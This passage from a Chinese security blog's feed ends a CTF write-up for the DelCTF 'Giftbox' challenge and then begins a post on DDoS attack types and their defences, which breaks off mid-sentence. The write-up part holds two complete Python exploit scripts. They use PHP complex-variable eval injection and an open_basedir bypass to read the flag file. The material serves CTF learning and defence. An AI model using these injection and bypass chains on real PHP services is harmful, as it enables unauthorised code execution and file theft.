id="最后exp"><a href="#最后exp" class="headerlink" title="最后exp"></a>最后exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>,</span><br><span class="line">                    params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">targeting</span>(<span class="params">code, position</span>):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;targeting &#x27;</span> + code + <span class="string">&#x27; &#x27;</span> + position, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;launch&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">destuct</span>():</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;destruct&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    login()</span><br><span class="line">    destuct()</span><br><span class="line">    targeting(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;chdir&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;img&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;&#123;$a($b)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;ini_set&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;open_basedir&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;f&quot;</span>, <span class="string">&quot;..&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;&#123;$d($e,$f)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;h&quot;</span>, <span class="string">&quot;&#123;$a($f)&#125;&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;i&quot;</span>, <span class="string">&quot;&#123;$a($f)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;j&quot;</span>, <span class="string">&quot;Ly8v&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;base64_&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;l&quot;</span>, <span class="string">&quot;decode&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;$k$l&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;n&quot;</span>, <span class="string">&quot;&#123;$m($j)&#125;&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;&#123;$d($e,$n)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;q&quot;</span>, <span class="string">&quot;file_get&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;r&quot;</span>, <span class="string">&quot;_contents&quot;</span>)</span><br><span class="line">    targeting(<span class="string">&quot;s&quot;</span>, <span class="string">&quot;$q$r&quot;</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">&quot;t&quot;</span>, <span class="string">&quot;&#123;$s($p)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(launch())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">totp=pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">url=<span class="string">&#x27;http://link-site/shell.php&#x27;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url,params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">destruct</span>():</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(url, params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>():</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;launch&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now(),</span><br><span class="line">        <span class="comment">#&#x27;w&#x27;:&#x27;&#x27;&#x27;print_r(scandir(&#x27;.&#x27;));&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#img是当前目录的一个文件夹，也可以改为其他当前目录文件夹</span></span><br><span class="line">        <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);readfile(&#x27;/flag&#x27;);&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">targeting</span>(<span class="params">code,pos</span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;targeting &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(code,pos),</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="built_in">print</span>(login().text)</span><br><span class="line"><span class="comment">###phpinfo测试</span></span><br><span class="line"><span class="comment">#targeting(&#x27;a&#x27;,&#x27;phpinfo&#x27;)</span></span><br><span class="line"><span class="comment">#targeting(&#x27;b&#x27;,&#x27;&#123;$a()&#125;&#x27;)</span></span><br><span class="line"><span class="comment">#print(launch().text)</span></span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;$_GET&#123;w&#125;&#125;&#x27;</span>)</span><br><span class="line">targeting(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;$&#123;eval($a)&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(launch().text)</span><br></pre></td></tr></table></figure></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/wuyanxin/totp.js">TOTP作者算法</a><br><a href="https://blog.csdn.net/chasingin/article/details/104642522/">W4nder师傅的wp</a><br><a href="https://xz.aliyun.com/t/5967">浅析DelCTF web之Giftbox题解</a><br><a href="https://www.zhaoj.in/read-6170.html">赵总的wp</a><br><a href="https://xz.aliyun.com/t/4785">从一道题讲PHP复杂变量</a><br><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
    <category term="write up" scheme="https://manayakko.github.io/yakko117/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>DDoS原理与防御</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-29T11:18:13.841Z</published>
    <updated>2020-03-31T14:03:09.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>感觉自己最近很颓废，因为一点小事就想着逃避，然后摸鱼摸一天<br>为什么要写这篇，主要是因为考试考到了，所以记录学习一下<br>                                – 懒狗发言</p><h1 id="DDoS简介"><a href="#DDoS简介" class="headerlink" title="DDoS简介"></a>DDoS简介</h1><p>**DDoS(Distributed Denial of Service)**，又称分布式拒绝服务攻击。<br>通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源o的正常访问。</p><h2 id="DDoS危害"><a href="#DDoS危害" class="headerlink" title="DDoS危害"></a>DDoS危害</h2><p>出口带宽堵死<br>游戏掉线导致客户流失<br>服务器连接数多，连接资源被耗尽<br>服务器卡、慢、死机、无法连接</p><h2 id="攻击来源"><a href="#攻击来源" class="headerlink" title="攻击来源"></a>攻击来源</h2><p>高性能服务器配合发包软件<br>可联网的设备(如打印机、摄像头、电视等等)<br>移动设备(数量多，增长速度快，其高性能利于组建僵尸网络)<br>个人PC(存在漏洞的PC或一些黑客迷自愿成为DDOS一员)<br>骇客控制的僵尸网络(僵尸网络又分为IRC型、HTTP型、P2P型)</p><h2 id="流量特点"><a href="#流量特点" class="headerlink" title="流量特点"></a>流量特点</h2><p>IP地址随机或固定某些IP段随机<br>没有完整完成三次握手<br>地址多数是伪造的<br>请求数量大、快</p><h2 id="导致DDoS原因"><a href="#导致DDoS原因" class="headerlink" title="导致DDoS原因"></a>导致DDoS原因</h2><p>个人因素：金钱利益 政治冲突 宗教冲突 为求出名</p><p>服务带宽上限 网络协议存在缺陷<br>服务器设备性能上限<br>应用性能上限<br>系统性能上限</p><hr><h1 id="攻击类型及防御"><a href="#攻击类型及防御" class="headerlink" title="攻击类型及防御"></a>攻击类型及防御</h1><h2 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h2><p>攻击者向网关发送 <code>ICMP请求包</code>，并将该 <code>ICMP请求报文的源地址</code> 伪造成 <code>受害主机IP地址</code>，目的地址为广播地址。<br>路由器在接受到该数据包，发现目的地址是<strong>广播地址</strong>，就会将该数据包广播出去，局域网内所有的 <strong>存活主机</strong> 都会受到一个 <code>ICMP请求包</code>，<strong>源地址是受害主机IP</strong>。接下来受害主机就会收到该网络内所有主机发来的 <code>ICMP应答报文</code> ，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" data-fancybox="group" data-caption="ddos_1" class="fancybox"><img alt="ddos_1" title="ddos_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" class="lazyload"></a></p><p>防护方案：</p><ul><li>禁止路由器广播ICMP请求包；</li><li>禁止操作系统对广播发出的ICMP请求包做出响应；</li><li>配置防火墙静止来自你所处网络外部的ping包</li></ul><hr><h2 id="TearDrop-Attack"><a href="#TearDrop-Attack" class="headerlink" title="TearDrop Attack"></a>TearDrop Attack</h2><p>在了解这种攻击之前，需要先知道什么是 <code>IP fragmentation(数据包分片)</code>。数据在网络中传输必定会产生数据包被分片，因为每种网络都有不同的最大单个数据包的大小，也就是常说的 <code>MTU (Maximum Transmission Unit，最大传输单元)</code>。当要传输的数据超过你要通信的那台主机所处网络的MTU时，数据包就会被分片进行传输，然后在到达目的地再重新组装成原来的数据包，下面是数据包分片重组过程</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" data-fancybox="group" data-caption="ddos_2" class="fancybox"><img alt="ddos_2" title="ddos_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" class="lazyload"></a></p><p><code>TearDrop Attack</code>，就是通过设置错误的片偏移，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" data-fancybox="group" data-caption="ddos_3" class="fancybox"><img alt="ddos_3" title="ddos_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" class="lazyload"></a></p><p>对比一下正常IP数据包和错误IP数据包</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" data-fancybox="group" data-caption="ddos_4" class="fancybox"><img alt="ddos_4" title="ddos_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" class="lazyload"></a></p><p>这种攻击主要对旧的windows版本和Linux版本有效，防护的话，可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。例如这个：<a href="https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html">分片重组检查算法 &lt;- link</a>。</p><p>网络安全设备将接收到的<strong>分片报文</strong>先放入<strong>缓存</strong>中，并根据<strong>源IP地址</strong>和<strong>目的IP地址</strong>对报文进行分组，源IP地址和目的IP地址均相同的报文归入同一组，然后对每组IP报文的相关分片信息进行检查，<strong>丢弃分片信息存在错误的报文</strong>。为了防止缓存益处，当缓存快要存满是，直接丢弃后续分片报文。</p><hr><h2 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h2><p>攻击者发动 <code>Land Attack</code> 攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。攻击过程如下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" data-fancybox="group" data-caption="ddos_5" class="fancybox"><img alt="ddos_5" title="ddos_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" class="lazyload"></a></p><p><strong>防御方案</strong>:</p><ul><li>通过<strong>设置防火墙和路由规则</strong>，检测源IP与目的IP相同的数据包，丢弃、过滤这种数据包。(类似上述的 <font color="6495ED">TearDrop Attack</font>)</li></ul><hr><h2 id="SYN-flood-attack-几个值得了解的关键点来了"><a href="#SYN-flood-attack-几个值得了解的关键点来了" class="headerlink" title="SYN flood attack (几个值得了解的关键点来了)"></a>SYN flood attack (几个值得了解的关键点来了)</h2><p><code>SYN flood attack</code> 是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有<font color="6495ED">SYN标志位的TCP报文</font>，与目标主机建立了很多虚假的<strong>半开连接</strong>，在服务器返回<font color="6495ED">SYN+ACK数据包</font>后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" data-fancybox="group" data-caption="ddos_6" class="fancybox"><img alt="ddos_6" title="ddos_6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" class="lazyload"></a></p><p><strong>防御方案</strong>:</p><ul><li><p><font color="6495ED">SYN Check</font>：使用防护设备，<strong>3次握手变成了6次握手</strong>，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。</p></li><li><p><font color="6495ED">Micro blocks</font>：管理员可以在内存中**为每个SYN请求创建一个小索引(小于16字节)**，而不必把整个连接对象存入内存。</p></li><li><p><font color="6495ED">RST cookies</font>：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。</p></li><li><p><font color="6495ED">STACK tweaking</font>：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括<strong>减小超时时间</strong>，<strong>等到堆栈存释内放时再分配连接</strong>，否则就随机性地删除传入的连接。</p></li></ul><h2 id="ACK-Flood-Attack"><a href="#ACK-Flood-Attack" class="headerlink" title="ACK Flood Attack"></a>ACK Flood Attack</h2><p><code>ACK Flood Attack</code> 是利用TCP三次握手过程。这里可以分为两种。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p><strong>攻击者</strong>伪造大量的 <code>SYN+ACK包</code> 发送给目标主机，目标主机每收到一个 <code>SYN+ACK数据包</code> 时，都会去<strong>自己的TCP连接表中查看有没有与ACK的发送者建立连接</strong> ，<strong>如果有则发送ACK包完成TCP连接，如果没有则发送 ACK+RST 断开连接</strong>。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致<font color="6495ED">正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。</font></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" data-fancybox="group" data-caption="ddos_7" class="fancybox"><img alt="ddos_7" title="ddos_7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" class="lazyload"></a></p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p><strong>利用TCP三次握手的ACK+SYN应答</strong>，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。</p><p>通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。<br><strong>防御方案</strong>可参考如下：</p><ul><li>采用CDN进行流量稀释；</li><li>避免服务器IP暴露在公网上；</li><li>通过限速或动态指纹的方式；</li><li>利用对称性判断来分析出是否有攻击存在；</li><li>在连续收到用户发送的ACK包时，中断回话，让其重连。</li></ul><h2 id="UDP-FLood-Attack"><a href="#UDP-FLood-Attack" class="headerlink" title="UDP FLood Attack"></a>UDP FLood Attack</h2><p><code>UDP</code>（<code>User Datagram Protocol</code>，用户数据报协议），是一种<strong>无连接和无状态的网络协议</strong>，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。<code>UDP FLood</code> 可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是<strong>占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" data-fancybox="group" data-caption="ddos_8" class="fancybox"><img alt="ddos_8" title="ddos_8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" class="lazyload"></a></p><p><strong>防御方案</strong>：</p><ul><li>限制每秒钟接受到的流量(可能产生误判)；</li><li>通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。</li></ul><hr><h2 id="NTP放大攻击-初步只作点了解"><a href="#NTP放大攻击-初步只作点了解" class="headerlink" title="NTP放大攻击(初步只作点了解)"></a>NTP放大攻击(初步只作点了解)</h2><p><code>NTP</code> (<code>Network Time Protocol</code>，网络时间协议)，是用来使计算机网络时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精度的时间校正，使用 <code>UDP 123</code> 端口进行通信。<br>通常在NTP服务器上会有一些调试接口，而 <strong>利用这些接口中的monlist请求，就可触发放大攻击。</strong> 当<strong>主机</strong>向 <code>NTP服务器</code> 发送 <strong>monlist查询请求</strong> 时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。</p><p>总结一下这种攻击产生的原因:</p><ul><li>请求与响应数据包不等价；</li><li>UDP协议的通信模糊性（无数据传输确认机制）；</li><li>NTP服务器的无认证机制。</li></ul><p>再来谈谈<strong>防御方案</strong>：</p><ul><li>使用防 <code>DDoS</code> 设备进行清洗；</li><li>加固并升级NTP服务器；</li><li>在网络出口封禁 <code>UDP 123</code> 时间同步端口；</li><li>通过网络层或者借助运营商实施 <code>ACL</code> 来防御；</li><li>关闭现在 <code>NTP</code> 服务的 <code>monlist</code> 功能，在 <code>ntp.conf</code>配置文件中增加<code>disable monitor</code> 选项。</li></ul><hr><h2 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h2><p>DNS(Domain Name System，域名系统)，由于使用IP地址来记忆各个网站比较困难，所以就产生了使用主机名称来表示对应的服务器，主机名称通过域名解析的过程转换成IP地址。下面来看一下DNS报文格式，以便了解攻击发生在何处。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" data-fancybox="group" data-caption="ddos_9" class="fancybox"><img alt="ddos_9" title="ddos_9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" class="lazyload"></a></p><p><strong>报文首部格式</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" data-fancybox="group" data-caption="ddos_10" class="fancybox"><img alt="ddos_10" title="ddos_10" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" class="lazyload"></a></p><p>报文首部各字段含义如下，其中高亮是攻击点之一</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" data-fancybox="group" data-caption="ddos_11" class="fancybox"><img alt="ddos_11" title="ddos_11" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" class="lazyload"></a></p><p>下面是问题记录中查询类型可设置的值，发现最后一个ANY类型会请求所有记录，这也是一个攻击点</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" data-fancybox="group" data-caption="ddos_12" class="fancybox"><img alt="ddos_12" title="ddos_12" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" class="lazyload"></a></p><h3 id="DNS递归查询"><a href="#DNS递归查询" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" data-fancybox="group" data-caption="ddos_13" class="fancybox"><img alt="ddos_13" title="ddos_13" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" class="lazyload"></a></p><h3 id="DNS递归查询-1"><a href="#DNS递归查询-1" class="headerlink" title="DNS递归查询"></a>DNS递归查询</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" data-fancybox="group" data-caption="ddos_14" class="fancybox"><img alt="ddos_14" title="ddos_14" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" class="lazyload"></a></p><p>从DNS数据包结构以及DNS递归查询过程，我们就可以大致分析出攻击原理。<br>首先，攻击者向 <strong>僵尸网络</strong> 发出指令，使僵尸网络中的每一台主机均发出一个 